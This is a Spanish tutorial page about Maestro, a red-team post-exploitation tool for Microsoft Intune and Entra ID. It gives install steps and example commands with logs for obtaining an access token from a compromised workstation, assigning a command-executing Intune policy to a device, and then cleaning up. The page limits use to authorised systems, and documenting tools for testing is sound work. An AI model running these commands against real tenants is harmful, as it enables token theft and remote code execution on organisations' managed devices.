---
title: "Maestro: la puerta trasera que nadie revisa en la nube"
slug: "maestro"
summary: "Maestro: enumeración y ataque de entornos cloud y Microsoft 365."
category: "ciberseguridad"
level: "Intermedio"
reading: 7
tags: ["recursos-y-automatización", "red-team", "ciberseguridad"]
updated: "2026-11-01"
featured: false
order: 999
---

## Qué es Maestro

**Maestro** es una herramienta de código abierto orientada a operaciones de red team y adversary simulation. En un ejercicio de red team, esta herramienta aporta capacidad operativa en una fase concreta del ataque y ayuda a medir la madurez defensiva.

> Descripción oficial: Maestro is a post-exploitation tool designed to interact with Intune/EntraID from a C2 agent on a user’s workstation without requiring knowledge of the user’s password or Azure authentication flows, token manipulation, and web-based administration console.

## Para qué sirve

Maestro se utiliza en la fase de **recursos y automatización** (cloud). Su función es automatizar o simplificar una tarea técnica que, hecha a mano, consumiría tiempo y aumentaría el riesgo de errores.

En la práctica, se integra en cadenas de ataque sobre Windows y Active Directory, donde el operador necesita ejecución fiable y controlada.

## Instalación

```bash
git clone https://github.com/Mayyhem/Maestro
cd Maestro
```

> Revisa el README oficial para dependencias específicas, versiones y notas de compilación.

## Uso básico

```bash
.\Maestro.exe get access-token -m 2 -t mayyhem.onmicrosoft.com -c 1950a258-227b-4e31-a9cf-717495945fc2 -s https://graph.microsoft.com/.default
2025-02-06 21:09:24.701 UTC - [INFO]    Execution started
2025-02-06 21:09:24.810 UTC - [INFO]    MSAL DLL loaded and ready for use.
2025-02-06 21:09:24.810 UTC - [INFO]    SharpGetEntraToken attempting to get an access token
2025-02-06 21:09:25.857 UTC - [INFO]    SharpGetEntraToken got an access token:
eyJ0...tDOg
2025-02-06 21:09:25.982 UTC - [INFO]    Completed execution in 00:00:01.3203797
```

```bash
.\Maestro.exe exec intune upload -i e537180b-6d04-427e-bf93-dbde818400eb -n MyPolicy --url 'https://maestro2go.blob.core.windows.net/uploads?st=2025-01-14T20:19:57Z&se=2025-01-15T04:19:57Z&si=All&sv=2022-11-02&sr=c&sig=QYri...ZkpA%3D' --commands "%windir%\system32\dsregcmd.exe"
...
2025-01-14 20:20:28.251 UTC - [INFO]    Creating new device assignment filter with displayName: d004a709-aae6-4fbf-91cd-48f227272c97
2025-01-14 20:20:28.251 UTC - [INFO]    Requesting devices from Intune
2025-01-14 20:20:28.267 UTC - [INFO]    Requesting IntuneDevices from Microsoft Graph
2025-01-14 20:20:28.783 UTC - [INFO]    Found 1 IntuneDevice matching query in Microsoft Graph
2025-01-14 20:20:29.017 UTC - [INFO]    Found 1 devices in filtered results
2025-01-14 20:20:29.361 UTC - [INFO]    Obtained filter ID: 6fdc043b-4c3a-4f77-b9a3-0d65d9300e64
2025-01-14 20:20:29.379 UTC - [INFO]    Creating custom config policy for device: e537180b-6d04-427e-bf93-dbde818400eb
2025-01-14 20:20:29.649 UTC - [INFO]    Obtained policy ID: fbca5c35-5282-4ec7-87de-a2d16a743079
2025-01-14 20:20:29.680 UTC - [INFO]    Assigning policy fbca5c35-5282-4ec7-87de-a2d16a743079 with filter 6fdc043b-4c3a-4f77-b9a3-0d65d9300e64
2025-01-14 20:20:29.983 UTC - [INFO]    Successfully assigned policy with filter
2025-01-14 20:20:29.983 UTC - [INFO]    Successfully created and assigned diagnostic logs policy with request ID 651d2244-4ad7-4efe-bb5e-d017b0c27750
2025-01-14 20:20:29.999 UTC - [INFO]    Not syncing automatically, execute the following to force device sync:

    .\Maestro.exe exec intune sync -i e537180b-6d04-427e-bf93-dbde818400eb

Clean up after execution:
    .\Maestro.exe delete intune policy -i fbca5c35-5282-4ec7-87de-a2d16a743079
    .\Maestro.exe delete intune filter -i 6fdc043b-4c3a-4f77-b9a3-0d65d9300e64

2025-01-14 20:20:29.999 UTC - [INFO]    Completed execution in 00:00:04.8572902
```

## Compatibilidad y requisitos

- **Lenguaje principal:** C#
- **Última actualización del repositorio:** 2026-01-20
- **Estrellas en GitHub:** 383
- **Termux:** no

**Requiere Windows o un entorno Windows.** Esta herramienta está diseñada para Windows, .NET, Active Directory o Cobalt Strike. No se ejecuta de forma nativa en Termux; úsala en una máquina virtual, un laboratorio aislado o un equipo de pruebas con Windows.

## Ética y alcance

Usa Maestro únicamente en sistemas propios o con autorización escrita. El uso no autorizado es ilegal. En laboratorio, aísla la red, documenta cada paso y respeta el alcance acordado.

## Referencias

- Repositorio oficial: https://github.com/Mayyhem/Maestro
- Toolkit de origen: Red Teaming Toolkit
